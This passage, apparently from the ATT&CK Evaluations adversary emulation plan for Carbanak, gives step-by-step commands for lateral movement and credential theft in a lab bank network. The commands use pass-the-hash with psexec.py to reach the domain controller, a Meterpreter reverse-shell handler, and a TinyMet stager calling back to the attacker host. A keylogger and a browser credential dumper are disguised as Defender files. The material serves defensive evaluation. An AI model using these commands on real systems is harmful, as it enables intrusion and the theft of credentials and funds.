        <doc-anchor-trigger class="header-anchor-trigger" to="#test-4-lateral-movement-via-pass-the-hash">#</doc-anchor-trigger>
        <span>Test 4: Lateral Movement via Pass-the-Hash</span>
    </h2>
</doc-anchor-target>
<p>The attacker uses <strong>PsExec.py</strong>, providing a password hash for authentication (<a href="https://attack.mitre.org/techniques/T1550/002/" class="outbound" target="_blank"><span>T1550</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>), to gain a shell on the DC from <code v-pre>bankfileserver</code> (<a href="https://attack.mitre.org/techniques/T1569/002/" class="outbound" target="_blank"><span>T1569.002</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://attack.mitre.org/techniques/T1021/002/" class="outbound" target="_blank"><span>T1021.002</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>). They then upload and execute a second stage payload, <strong>Tiny.exe</strong>, over this SMB channel to receive a more powerful shell.</p>
<p>This step consists of behaviors found in Step 5 of Scenario 1.</p>
<doc-anchor-target id="4a---lateral-movement-via-psexec--pass-the-hash-t1569002-t1550">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#4a---lateral-movement-via-psexec--pass-the-hash-t1569002-t1550">#</doc-anchor-trigger>
        <span>4.A - Lateral Movement via PsExec + Pass-the-Hash (<a href="https://attack.mitre.org/techniques/T1569/002/" class="outbound" target="_blank"><span>T1569.002</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://attack.mitre.org/techniques/T1550/002/" class="outbound" target="_blank"><span>T1550</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h3>
</doc-anchor-target>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Start <code v-pre>tmux</code> if it is not already started</p>
<p><code v-pre>tmux</code></p>
</li>
<li><p>Start Metasploit</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo msfconsole</code></pre>
</doc-codeblock></div>
</li>
<li><p>Set up TCP listener for Meterpreter on TCP port 8080</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lport 8080
set lhost 192.168.0.4
set ExitOnSession False
exploit -j</code></pre>
</doc-codeblock></div>
</li>
<li><p>Open a new <code v-pre>tmux</code> terminal</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Ctrl+b c</code></pre>
</doc-codeblock></div>
</li>
<li><p>Copy needed files to the local staging folder (<code v-pre>/tmp/</code>)</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cp ~/Enterprise/carbanak/Resources/step5/impacket_exe /tmp/runtime
cp ~/Enterprise/carbanak/Resources/step5/psexec.py /tmp/
cp ~/Enterprise/carbanak/Resources/step5/tiny.exe /tmp/
cd /tmp/</code></pre>
</doc-codeblock></div>
</li>
<li><p>SCP those files to <code v-pre>bankfileserver</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">scp runtime psexec.py tiny.exe &lt;domain_admin&gt;@&lt;bankfileserver_ip&gt;:/tmp/</code></pre>
</doc-codeblock></div>
<p>Enter <code v-pre>&lt;domain_admin&gt;</code>&#x27;s password when prompted:</p>
<p><code v-pre>&lt;domain_admin_password&gt;</code></p>
</li>
<li><p>SSH into <code v-pre>bankfileserver</code> as <code v-pre>&lt;domain_admin&gt;</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">ssh &lt;domain_admin&gt;@&lt;bankfileserver_ip&gt;</code></pre>
</doc-codeblock></div>
<p>Enter <code v-pre>&lt;domain_admin&gt;</code>&#x27;s password when prompted:</p>
<p><code v-pre>&lt;domain_admin_password&gt;</code></p>
</li>
<li><p>Change to the <code v-pre>tmp</code> directory on <code v-pre>bankfileserver</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">&lt;domain_admin&gt;@bankfileserver:~$ cd /tmp/</code></pre>
</doc-codeblock></div>
</li>
<li><p>Modify permissions on <code v-pre>runtime</code> to make it world-executable</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">&lt;domain_admin&gt;@bankfileserver:~$ chmod 755 /tmp/runtime</code></pre>
</doc-codeblock></div>
</li>
<li><p>Use <code v-pre>runtime</code> to execute <code v-pre>psexec.py</code> with the <code v-pre>&lt;domain_admin&gt;</code>&#x27;s password hash to connect to <code v-pre>bankdc</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./runtime psexec.py &lt;domain_full&gt;/&lt;domain_admin&gt;@&lt;bankdc_ip&gt; -hashes &lt;domain_admin_password_ntlm_hash&gt;</code></pre>
</doc-codeblock></div>
<p>You should have a shell on the domain controller now.</p>
</li>
</ol>
<doc-anchor-target id="4b---lateral-tool-transfer-and-execution-t1570">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#4b---lateral-tool-transfer-and-execution-t1570">#</doc-anchor-trigger>
        <span>4.B - Lateral Tool Transfer and Execution (<a href="https://attack.mitre.org/techniques/T1570/" class="outbound" target="_blank"><span>T1570</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li><p>Serve TinyMet over SMB</p>
<p>From pass-the-hash shell:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">[bankdc CMD]&gt; put tiny.exe</code></pre>
</doc-codeblock></div>
</li>
<li><p>Execute TinyMet</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">[bankdc CMD]&gt; start /b C:\Windows\tiny.exe 192.168.0.4 8080</code></pre>
</doc-codeblock></div>
</li>
<li><p>Switch back to the Metasploit <code v-pre>tmux</code> terminal</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Ctrl+b n</code></pre>
</doc-codeblock></div>
</li>
<li><p>Interact with the new <strong>Tiny.exe</strong> Meterpreter session</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sessions -i 1</code></pre>
</doc-codeblock></div>
</li>
<li><p>Verify the session works</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; getpid</code></pre>
</doc-codeblock></div>
</li>
<li><p>Close Meterpreter</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exit Metasploit</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">msf &gt; exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Switch to <code v-pre>psexec</code> shell</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Ctrl+b n</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exit psexec shell</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">[bankdc CMD]&gt; exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exit <code v-pre>bankfileserver</code> SSH session</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">&lt;domain_admin&gt;@bankfileserver:~$ exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exit <code v-pre>tmux</code> session</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">tmux kill-session</code></pre>
</doc-codeblock></div>
</li>
</ol>
<doc-anchor-target id="cited-intelligence-3">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-3">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li>Carbanak is known to use psexec, or other variations, to perform lateral movement and execute remote commands.<sup><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></sup></li>
<li>Carbanak is known to use TinyMet as a stager to execute Meterpreter as a stage 1 RAT.<sup><a href="https://www.crowdstrike.com/blog/arrests-put-new-focus-on-carbon-spider-adversary-group/" class="outbound" target="_blank"><span>3</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></sup></li>
</ul>
<hr>
<doc-anchor-target id="test-5-credential-access">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#test-5-credential-access">#</doc-anchor-trigger>
        <span>Test 5: Credential Access</span>
    </h2>
</doc-anchor-target>
<p>The attacker collects information needed to wire money to illicit accounts. The attacker performs keylogging (<a href="https://attack.mitre.org/techniques/T1056/001/" class="outbound" target="_blank"><span>T1056.001</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) to monitor the CFO user&#x27;s behavior, after which they steal the user&#x27;s credentials from their web browser (<a href="https://attack.mitre.org/techniques/T1555/003/" class="outbound" target="_blank"><span>T1555.003</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>).</p>
<p>This step consists of behaviors found in Step 9 of Scenario 1.</p>
<doc-anchor-target id="procedures-3">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-3">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="5a---user-monitoring---t1056001">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#5a---user-monitoring---t1056001">#</doc-anchor-trigger>
        <span>5.A - User Monitoring - (<a href="https://attack.mitre.org/techniques/T1056/001/" class="outbound" target="_blank"><span>T1056.001</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Upload the keylogger to the <code v-pre>cfo</code> workstation</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo smbclient -U '&lt;domain_full&gt;\&lt;domain_admin&gt;' //&lt;cfo_ip&gt;/C$ -c &quot;put /home/&lt;attacker&gt;/Enterprise/carbanak/Resources/step9/keylogger.exe Users\\&lt;cfo_user&gt;\\AppData\\Local\Temp\\DefenderUpgradeExec.exe&quot;</code></pre>
</doc-codeblock></div>
<p>Enter <code v-pre>&lt;domain_admin&gt;</code>&#x27;s password when prompted:</p>
<p><code v-pre>&lt;domain_admin_password&gt;</code></p>
</li>
</ol>
<p>On <code v-pre>cfo</code>:</p>
<ol>
<li><p>Login to the <code v-pre>cfo</code> workstation as the <code v-pre>&lt;cfo_user&gt;</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">xfreerdp +clipboard /u:&quot;&lt;cfo_user&gt;@&lt;domain_full&gt;&quot; /p:&quot;&lt;cfo_user_password&gt;&quot; /v:&lt;cfo_ip&gt;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Open a PowerShell window</p>
</li>
<li><p>Execute the keylogger</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cd $env:TEMP
start-process .\DefenderUpgradeExec.exe -WindowStyle Hidden</code></pre>
</doc-codeblock></div>
</li>
<li><p>Mimic user behavior</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">1. Open Edge, go to finance.yahoo.com

2. Open Payment Transfer System

3. Enter &quot;ATT&amp;CK EVALS&quot; in the box that sayd &quot;Widgets Inc&quot;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Open <code v-pre>cmd.exe</code> and kill keylogger</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">taskkill /F /IM DefenderUpgradeExec.exe
exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Switch to PowerShell window and view keylogger dump</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">get-content klog2.txt</code></pre>
</doc-codeblock></div>
</li>
</ol>
<doc-anchor-target id="5b---credentials-from-web-browsers-t1070004">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#5b---credentials-from-web-browsers-t1070004">#</doc-anchor-trigger>
        <span>5.B - Credentials from Web Browsers (<a href="https://attack.mitre.org/techniques/T1070/004/" class="outbound" target="_blank"><span>T1070.004</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Upload the Web Credential Dumper to the <code v-pre>cfo</code> workstation</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo smbclient -U '&lt;domain_full&gt;\&lt;domain_admin&gt;' //&lt;cfo_ip&gt;/C$ -c &quot;put /home/&lt;attacker&gt;/Enterprise/carbanak/Resources/step9/dumpWebCreds.exe Users\\&lt;cfo_user&gt;\\AppData\\Local\\Temp\\infosMin48.exe&quot;</code></pre>
</doc-codeblock></div>
<p>Enter <code v-pre>&lt;domain_admin&gt;</code>&#x27;s password when prompted:</p>
<p><code v-pre>&lt;domain_admin_password&gt;</code></p>
</li>
</ol>
<p>On the <code v-pre>cfo</code> workstation:</p>
<ol start="2">
<li><p>Run the Web Cred Dumper from PowerShell</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">.\infosMin48.exe</code></pre>
</doc-codeblock></div>
</li>
<li><p>Close PowerShell window</p>
</li>
<li><p>Close RDP session</p>
</li>
</ol>
<doc-anchor-target id="cited-intelligence-4">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-4">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li>Carbanak is known to deploy software that can monitor a user&#x27;s keystrokes.<sup><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></sup></li>
<li>Carbanak has tools that are built for collecting credentials from browsers and applications.<sup><a href="https://www.rsa.com/en-us/blog/2017-11/the-carbanak-fin7-syndicate" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></sup></li>
</ul>
<hr>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/carbanak/emulation_plan/scenario_1/infrastructure/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Scenario 1 Infrastructure</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/carbanak/emulation_plan/scenario_2/infrastructure/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Scenario 2 Infrastructure</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                        <li>
                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="https://github.com/attackevals/ael">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                    <g fill="currentColor">
                                                        <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                                    </g>
                                                </svg>
                                                <span>ATTACK Evaluations Library GitHub</span>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>Â© Copyright 2024. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
